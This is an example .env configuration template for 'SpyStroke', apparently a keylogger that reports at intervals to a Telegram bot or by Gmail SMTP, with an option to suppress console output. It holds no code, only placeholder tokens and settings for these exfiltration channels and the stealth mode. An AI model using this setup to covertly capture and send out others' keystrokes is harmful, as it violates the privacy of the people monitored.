# ---------------------------------------------------------------------------
# SpyStroke configuration
#
# Copy this file to `.env` and fill in your values. Never commit `.env`.
# ---------------------------------------------------------------------------

# --- Telegram entry point (telegram/spystroke.py) -------------------------
SPYSTROKE_BOT_TOKEN=123456:ABC-DEF...          # from @BotFather
SPYSTROKE_CHAT_ID=123456789                    # from @userinfobot / @getmyid_bot
SPYSTROKE_INTERVAL=10                          # seconds between reports

# --- Email entry point (email/SpyStroke.py) --------------------------------
# SPYSTROKE_EMAIL=you@gmail.com
# SPYSTROKE_EMAIL_PASSWORD=your-app-password    # Gmail requires an app password
# SPYSTROKE_RECEIVER=                           # optional, defaults to sender
# SPYSTROKE_SMTP_HOST=smtp.gmail.com
# SPYSTROKE_SMTP_PORT=587
# SPYSTROKE_SMTP_TLS=1

# --- Shared -----------------------------------------------------------------
# SPYSTROKE_SILENT=0                            # 1 = suppress console output
# SPYSTROKE_LOG_FILE=spystroke.log              # optional file logging
